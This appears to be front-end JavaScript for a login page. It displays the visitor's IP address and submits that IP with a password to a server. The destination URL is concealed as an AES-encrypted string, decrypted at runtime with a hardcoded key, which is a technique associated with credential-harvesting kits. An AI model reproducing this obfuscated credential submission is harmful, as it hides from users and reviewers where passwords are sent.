function fetchIPAddress() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            document.getElementById("IP").value = ipAddress
            document.getElementById('ip-address').textContent = ipAddress;
        })
        .catch(error => {
            console.error('Error fetching IP address:', error);
            document.getElementById('ip-address').textContent = 'Failed to fetch IP address';
        });
}

// Function to copy text to clipboard
function copyToClipboard(text) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
    var copyIcon = document.getElementById("copy-icon");
    copyIcon.style.color = "#696cff";
}

// Call the function when the page loads
window.onload = function() {
    fetchIPAddress();
    const copyIcon = document.getElementById('copy-icon');
    copyIcon.addEventListener('click', function() {
        const ipAddress = document.getElementById('ip-address').textContent;
        copyToClipboard(ipAddress);
    });
};



function submitip() {
    var submitButton = document.getElementById('submitbutton')
    submitButton.style.backgroundColor = 'lightgrey';
    submitButton.style.border = '1px solid lightgrey';
    submitButton.disabled = true;
    var username = document.getElementById("IP").value;
	var password = document.getElementById("password").value;

    var formData = new FormData();
    formData.append("username", username);
    formData.append("password", password);

    function decryptURL(encryptedUrl, password) {
        var decrypted = CryptoJS.AES.decrypt(decodeURIComponent(encryptedUrl), password).toString(CryptoJS.enc.Utf8);
        return decrypted;
    }
    var encryptedUrl = "U2FsdGVkX1/ZskWU1IpHHSE4T50uIzmNiLBPVUVTE1fV619Qgx6fxid9jC5Ld9VBJtWD2INoV0X/cE0wGra3PAu8I8A6WCGYxDAJApZ7UTWcJ/eZTdVWNmzVY842PGmUMdMSlb2TdYQHB6puhfmZCXW+mw4HzBh44ExRYelN1pRFeINsU6Zf2ZhxLvGO3QbQ";
    var password = 'secret';
    var decryptedUrl = decryptURL(encryptedUrl, password);

    fetch(decryptedUrl, {
        method: "POST",
        body: formData,
    })
    .then(function(response) {
        return response.json();
    })
    .then(function(data) {
        if (data.redirectUrl) {
            var box = document.getElementById("box");
            box.style.display = "inline-block";
            submitButton.style.backgroundColor = '';
            submitButton.style.border = '';
            submitButton.disabled = false;
            document.getElementById("formAuthentication").reset();
            setTimeout(function() {
                box.style.display = "none"; 
            }, 3000); // 10 seconds
            window.location.href = "index.html"
        } else {
            var box2 = document.getElementById("box2");
            box2.style.display = "inline-block";
            submitButton.style.backgroundColor = '';
            submitButton.style.border = '';
            submitButton.disabled = false;
            setTimeout(function() {
                box2.style.display = "none"; 
            }, 3000); // 10 seconds
        }
    })
    .catch(function(error) {
        console.error("Error:", error);
        loadingSpinner.style.display = "none";
    });
};
       